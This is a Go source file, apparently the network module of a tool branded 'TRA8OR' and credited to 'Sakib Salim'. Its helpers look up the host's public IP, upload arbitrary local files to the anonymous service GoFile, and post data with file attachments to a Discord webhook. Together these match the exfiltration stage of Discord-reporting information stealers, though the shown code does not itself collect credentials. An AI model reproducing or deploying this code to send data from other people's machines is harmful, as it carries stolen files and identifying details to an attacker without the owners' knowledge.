package requests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
)

// Get sends an HTTP GET request to the specified URL with optional headers.
// Returns the response body as a byte slice or an error if the request fails.
func Get(url string, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Add headers if provided
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Read the response body
	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return res, nil
}

// GetIP retrieves the public IP address of the system using an external service.
// If the request fails, it retries recursively.
func GetIP() string {
	res, err := Get("https://api.ipify.org")
	if err != nil {
		return GetIP()
	}
	return string(res)
}

// Post sends an HTTP POST request to the specified URL with a JSON body and optional headers.
// Returns the response body as a byte slice or an error if the request fails.
func Post(url string, body []byte, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}

	// Add headers if provided
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Read the response body
	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return res, nil
}

// Upload uploads a file to the GoFile service and returns the download page URL or an error.
func Upload(file string) (string, error) {
	// Get the server for the upload
	res, err := Get("https://api.gofile.io/getServer")
	if err != nil {
		return "", err
	}

	var server struct {
		Status string `json:"status"`
		Data   struct {
			Server string `json:"server"`
		} `json:"data"`
	}

	if err := json.Unmarshal(res, &server); err != nil {
		return "", err
	}

	if server.Status != "ok" {
		return "", fmt.Errorf("error getting server")
	}

	// Prepare the file upload request
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	fw, err := writer.CreateFormFile("file", file)
	if err != nil {
		return "", err
	}

	fd, err := os.Open(file)
	if err != nil {
		return "", err
	}
	defer fd.Close()

	if _, err := io.Copy(fw, fd); err != nil {
		return "", err
	}

	writer.Close()

	// Send the file to the upload server
	res, err = Post(fmt.Sprintf("https://%s.gofile.io/uploadFile", server.Data.Server), body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
	if err != nil {
		return "", err
	}

	var response struct {
		Data struct {
			DownloadPage string `json:"downloadPage"`
		} `json:"data"`
	}

	if err := json.Unmarshal(res, &response); err != nil {
		return "", err
	}

	if response.Data.DownloadPage == "" {
		return "", fmt.Errorf("error uploading file")
	}

	return response.Data.DownloadPage, nil
}

// Webhook sends a payload to a Discord webhook URL with optional attachments.
func Webhook(webhook string, data map[string]interface{}, files ...string) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	i := 0

	// If there are more than 10 files, split the webhook calls into chunks
	if len(files) > 10 {
		Webhook(webhook, data)
		for _, file := range files {
			i++
			Webhook(webhook, map[string]interface{}{"content": fmt.Sprintf("Attachment %d: `%s`", i, file)}, file)
		}
		return
	}

	// Add attachments
	for _, file := range files {
		openedFile, err := os.Open(file)
		if err != nil {
			continue
		}
		defer openedFile.Close()

		filePart, err := writer.CreateFormFile(fmt.Sprintf("file[%d]", i), openedFile.Name())
		if err != nil {
			continue
		}

		if _, err := io.Copy(filePart, openedFile); err != nil {
			continue
		}
		i++
	}

	// Add payload JSON field
	jsonPart, err := writer.CreateFormField("payload_json")
	if err != nil {
		return
	}

	data["username"] = "TRA8OR"
	data["avatar_url"] = "https://i.ibb.co.com/CPrt4Dg/1732257842387.jpg"

	// Add embeds with customizations
	if data["embeds"] != nil {
		for _, embed := range data["embeds"].([]map[string]interface{}) {
			embed["footer"] = map[string]interface{}{
				"icon_url": "https://avatars.githubusercontent.com/u/144510317?s=96&v=4",
				"text":     "Made by Sakib Salim",
			}
			embed["color"] = 0xb143e3
		}
	}

	if err := json.NewEncoder(jsonPart).Encode(data); err != nil {
		return
	}

	if err := writer.Close(); err != nil {
		return
	}

	// Send the webhook request
	Post(webhook, body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
}
